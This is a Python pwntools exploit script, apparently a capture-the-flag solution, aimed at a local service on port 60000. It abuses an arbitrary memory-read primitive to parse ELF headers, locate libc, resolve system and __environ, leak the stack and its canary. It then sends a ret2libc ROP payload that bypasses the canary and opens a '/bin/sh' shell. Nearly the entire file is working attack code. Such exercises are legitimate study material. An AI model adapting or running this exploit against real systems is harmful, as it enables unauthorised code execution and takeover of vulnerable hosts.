from pwn import *

# all of the parsing code assumes ELF64 because this is the type of code 
# that only has to work once.

dumpDataToFile = False;
PT_DYNAMIC = 2;
PT_LOAD = 1;
context.arch = "amd64"
context.endian = "little"
context.word_size = 64;
context.terminal = ["tmux", "splitw", "-h"]
DOCDIR = "./doc";

p = None;
g = cyclic_gen();

def initializeProcess():
    global p;

    p = remote("localhost", 60000);

def main():
    initializeProcess();
    userBaseAddress = 0x400000;
    plt_addr, _, _, _, _ = getSections(userBaseAddress);

    libc_addr = getModuleBaseAddress(plt_addr);
    print(f"Found base address of libc {hex(libc_addr)}");

    _, libc_strtab_addr, libc_symtab_addr, libc_symtab_entsize, libc_strtab_size = getSections(libc_addr);
    print(f"Libc symtab address {hex(libc_symtab_addr)}");
    print(f"Libc symtab entry size {libc_symtab_entsize}");
    print(f"Libc strtab address {hex(libc_strtab_addr)}");

    libc_strtab = buildStrtab(libc_strtab_addr, libc_strtab_size);

    if(dumpDataToFile):
        # dump symbols for later inspection
        dumpSymbolsToFile(libc_symtab_addr, libc_symtab_entsize, libc_strtab, f"{DOCDIR}/sym.dump");

    environ_offset = resolveSymbol("__environ", libc_symtab_addr, libc_symtab_entsize, libc_strtab)
    environ_address = environ_offset + libc_addr;
    stack_address = readAddressUInt(environ_address);
    print(f"Found a stack address: {hex(stack_address)}");

    exeSegmentVaddr, exeSegmentSize = getExecutableSegmentVaddrSize(libc_addr);
    print(f"Exe Segment Offset: {hex(exeSegmentVaddr)}\n")
    exeSegmentVaddr = libc_addr + exeSegmentVaddr;
    print(f"Exe Segment Vaddr: {hex(exeSegmentVaddr)}\nExe Segment Size {hex(exeSegmentSize)}");

    if(dumpDataToFile):
        dumpExeSegmentToFile(exeSegmentVaddr, exeSegmentSize, f"{DOCDIR}/exe.bin");

    stack = leakStack(stack_address, 0x800);
    main_rsp, main_rbp, canary_value = getMainStackFrame(stack);
    print(f"Stack frame info:\n RSP {hex(main_rsp)}\n RBP {hex(main_rbp)}\n CANARY {hex(canary_value)}");

    if(dumpDataToFile):
        dumpStackToFile(stack, stack_address, f"{DOCDIR}/stack_leak.hex");

    system_offset = resolveSymbol("system", libc_symtab_addr, libc_symtab_entsize, libc_strtab)
    if(ret2(libc_addr + system_offset, main_rsp, main_rbp, canary_value, libc_addr) == -1):
        print("\n\nCongratulations! the payload contains a '\\n' character which will get zero'd by scanf, making the program crash. Running again\n\n");
        initializeProcess();
        main();


def readAddress(address, size=8):
    if(size > 8):
        raise Exception("nope");
    p.sendline(bytes(f"{hex(address)}", "ascii"))
    ret = p.recvuntil(b'\n');
    # print(hex(address), ret);
    ret = struct.pack("<Q", int(ret.strip()));
    if(size != 8):
        ret = ret[:size];
    return ret;

def readAddressUInt(address, size=8):
    return int.from_bytes(readAddress(address, size), "little", signed=False);

def readAddressInt(address, size=8):
    return int.from_bytes(readAddress(address, size), "little", signed=True);

def getELFType(baseAddress):
    return readAddressUInt(baseAddress + 16, 2);

def getProgramHeadersOffset(baseAddress):
    return readAddressUInt(baseAddress + 32);

def getProgramHeaderSizeAndNum(baseAddress):
    size = readAddressUInt(baseAddress + 54, 2);
    num = readAddressUInt(baseAddress + 56, 2);
    return (size, num);

def getSectionHeaderOffset(baseAddress):
    return readAddressUInt(baseAddress + 40);

def getSectionHeaderSizeAndNum(baseAddress):
    size = readAddressUInt(baseAddress + 58, 2);
    num = readAddressUInt(baseAddress + 60, 2);
    return (size, num);

def getSectionHeaderStringTableIndex(baseAddress):
    return readAddressUInt(baseAddress + 62, 2);

def parseSegmentHeader(address):
    type = readAddressUInt(address, 4);
    flags = readAddressUInt(address + 4, 4);
    vaddr = readAddressUInt(address + 16);
    size = readAddressUInt(address + 40);
    return (type, flags, vaddr, size);

def getDynamicSegmentVaddrSize(baseAddress):
    ph_offset = baseAddress + getProgramHeadersOffset(baseAddress);
    ph_size , ph_num = getProgramHeaderSizeAndNum(baseAddress);
    for i in range(ph_num):
        segmentData = parseSegmentHeader(ph_offset + i * ph_size);
        if(segmentData[0] == PT_DYNAMIC):
            return (segmentData[2], segmentData[3]);

def getExecutableSegmentVaddrSize(baseAddress):
    PF_EXE = 1;
    PF_READ = 4;
    ph_offset = baseAddress + getProgramHeadersOffset(baseAddress);
    ph_size , ph_num = getProgramHeaderSizeAndNum(baseAddress);
    for i in range(ph_num):
        segmentData = parseSegmentHeader(ph_offset + i * ph_size);
        if(segmentData[1] & PF_EXE != 0 and segmentData[1] & PF_READ != 0 and segmentData[0] == PT_LOAD):
            return (segmentData[2], segmentData[3]);

def parseDynamicSegment(address):
    tag = readAddressUInt(address, 8);
    val = readAddressUInt(address + 8, 8);
    return (tag, val);

def getSections(baseAddress):
    DT_STRTAB = 5;
    DT_SYMTAB = 6;
    DT_STRSZ  = 10;
    DT_SYMENT = 11;
    DT_JMPREL = 23;

    ET_EXEC = 2
    ET_DYN = 3

    strtab_addr = None;
    symtab_addr = None;
    plt_addr = None;
    symtab_addr = None;

    dyn_vaddr, dyn_size = getDynamicSegmentVaddrSize(baseAddress);
    elf_type = getELFType(baseAddress);
    if(elf_type==ET_EXEC):
        pass
    elif(elf_type==ET_DYN):
        dyn_vaddr += baseAddress;
    else:
        raise Exception("Should not happen");

    dynamic_entry_size = 16;
    for i in range(dyn_size // dynamic_entry_size):
        tag, val = parseDynamicSegment(dyn_vaddr + i * dynamic_entry_size)
        if(tag == DT_SYMTAB):
            symtab_addr = val;
        elif(tag == DT_STRTAB):
            strtab_addr = val;
        elif(tag == DT_JMPREL):
            plt_addr = val;
        elif(tag == DT_SYMENT):
            symtab_entsize = val;
        elif(tag == DT_STRSZ):
            strtab_size = val;

    if(elf_type==ET_EXEC and plt_addr != None):
        plt_addr = readAddressUInt(plt_addr, 8);
        if(plt_addr != None):
            plt_addr = readAddressUInt(plt_addr, 8);

    return (plt_addr, strtab_addr, symtab_addr, symtab_entsize, strtab_size)

def getModuleBaseAddress(moduleAddress):
    moduleAddress = moduleAddress & 0xfffffffffffff000;

    while(True):
        leak = readAddress(moduleAddress, 4);
        if(leak == b"\x7fELF"):
            break;
        moduleAddress = moduleAddress - 0x1000;
    
    return moduleAddress;

def buildStrtab(strtabAddress, strtab_size):
    read = 0;
    strtab = b"";
    while(read + 8 < strtab_size):
        strtab += readAddress(strtabAddress+read)
        read += 8
    strtab += readAddress(strtabAddress, read - strtab_size)
    return strtab;

def parseSymbol(address):
    STT_NOTYPE = 0
    STT_OBJECT = 1
    STT_FUNC = 2
    STT_SECTION = 3
    STT_FILE = 4
    STT_COMMON = 5
    STT_TLS = 6
    nameidx = readAddressUInt(address, 4);
    type = (readAddressUInt(address + 4, 1) & 0xf);
    if(type == STT_NOTYPE):
        type = "STT_NOTYPE"
    elif(type == STT_OBJECT):
        type = "STT_OBJECT"
    elif(type == STT_FUNC):
        type = "STT_FUNC"
    elif(type == STT_SECTION):
        type = "STT_SECTION"
    elif(type == STT_FILE):
        type = "STT_FILE"
    elif(type == STT_COMMON):
        type = "STT_COMMON"
    elif(type == STT_TLS):
        type = "STT_TLS"
    value = readAddressUInt(address + 8);
    size = readAddressUInt(address + 16);
    return (nameidx, value, type, size);

def dumpSymbolsToFile(symtab, symtab_entsize, strtab, filename):
    strtablen = len(strtab);
    f = open(filename, "w");
    i = 0;
    # yolo
    while(True):
        idx, value, type, size = parseSymbol(symtab + i * symtab_entsize)
        if(idx >= strtablen):
            print(f"{idx} > {strtablen}, returning");
            break;
        else:
            end = strtab[idx+1:].find(b'\x00');
            string = strtab[idx:idx+end+1];
            f.write(f"{type}\t| {hex(value)}\t| {str(string, "ascii")}\n");
        i += 1;
    f.close();

def resolveSymbol(name, symtab, symtab_entsize, strtab):
    strtablen = len(strtab);
    i = 0;
    # yolo once more
    while(True):
        idx, value, type, size = parseSymbol(symtab + i * symtab_entsize)
        i += 1;
        if(idx >= strtablen):
            print(f"{idx} > {strtablen}, returning");
            break;
        else:
            end = strtab[idx+1:].find(b'\x00');
            string = str(strtab[idx:idx+end+1], "ascii");
            if(string.lower() == name.lower()):
                print(f"Found {name} at {hex(value)}, type is {type}");
                return value;
    return None;

def leakStack(address, size):
    read = size;
    stackContents = [];
    read = 0;
    while(read < size):
        stackContents.append((address - read, readAddress(address - read)));
        read += 8;
    return stackContents;

def getMainStackFrame(stack):
    main_rbp = None;
    main_rsp = None;
    canary_value = None;
    found_addr = None;
    strtoulRetAddress = 0x401262;
    for entry in stack:
        value = int.from_bytes(entry[1], "little");
        if (value == strtoulRetAddress):
            found_addr = entry[0];
            break;
    # you can read about why this works in the writeup
    main_rsp = found_addr + 8;
    main_rbp = main_rsp + 0x30;
    canary_value = readAddressUInt(main_rbp - 8);
    return (main_rsp, main_rbp, canary_value);

def dumpStackToFile(stack, stack_address, filename):
    f = open(filename, "w");
    f.write(f"Stack base address : [{hex(stack_address)}]\n");
    for addrValue in stack:
        try:
            string = str(addrValue[1], "ascii");
        except UnicodeDecodeError:
            string = "";
        f.write(f"[{hex(addrValue[0])}]: {hex(int.from_bytes(addrValue[1], "little"))}, {string}\n");
    f.close();

def dumpExeSegmentToFile(segment, size, filename):
    read = 0;
    f = open(filename, "wb");
    print("Starting exe segment file dump...")
    while(read < size):
        data = readAddress(segment + read);
        read += 8;
        f.write(data);
    f.close();
    print("...done");

def ret2(address, main_rsp, main_rbp, canary_value, libc_addr):
    # see writeup for knowing where this comes from
    pop_rdi_ret = libc_addr + 0x967+0x24000;

    user_controlled_data_address = main_rbp + 16

    ret1 = pop_rdi_ret;
    ret2 = address;
    pointer_to_sh = user_controlled_data_address + 16;
    sh = b"/bin/sh\0";

    payload = b"q" + b"z" * 23;
    payload += p64(canary_value);
    payload += p64(user_controlled_data_address) + p64(ret1);
    payload += p64(pointer_to_sh);
    payload += p64(ret2);
    payload += sh;

    if(payload.find(b"\n") != -1):
        return -1;

    p.sendline(payload);
    p.interactive();

if __name__ == "__main__":
    main();